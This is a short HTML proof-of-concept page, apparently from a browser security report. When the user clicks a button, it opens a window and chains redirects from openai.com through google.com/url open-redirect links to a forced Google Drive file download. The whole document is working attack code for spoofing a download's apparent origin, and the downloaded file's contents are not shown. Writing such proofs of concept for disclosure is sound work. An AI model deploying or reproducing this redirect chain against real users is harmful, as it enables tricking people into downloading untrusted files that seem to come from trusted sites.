<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>poc</title>
  <script>
    function chainRedirect(w, urls, index = 0) {
      if (index < urls.length) {
        w.location.replace(urls[index]);
        setTimeout(() => chainRedirect(w, urls, index + 1), 1000);
      }
    }

    function startRedirect() {
      let w = window.open("");
      setTimeout(() => {
        chainRedirect(w, [
        "https://openai.com",
        "https://google.com/url?q=https://drive.usercontent.google.com/download?id=1mbE4bbKVVJLkO7nE8H45ur4AgoD9I8xs&export=download&authuser=0&confirm=t&uuid=086db75d-e820-46b4-91ea-3676cb587cfa&at=AGN2oQ0j5maIVgsqrmW8F-Hyj0b_:1773905514263",
        "https://google.com/url?q=https://drive.usercontent.google.com/download?id=1mbE4bbKVVJLkO7nE8H45ur4AgoD9I8xs&export=download&authuser=0&confirm=t&uuid=086db75d-e820-46b4-91ea-3676cb587cfa&at=AGN2oQ0j5maIVgsqrmW8F-Hyj0b_:1773905514263",
        ]);
      }, 1000);
    }
  </script>
</head>
<body>
  <button onclick="startRedirect()">Start</button>
</body>
</html>
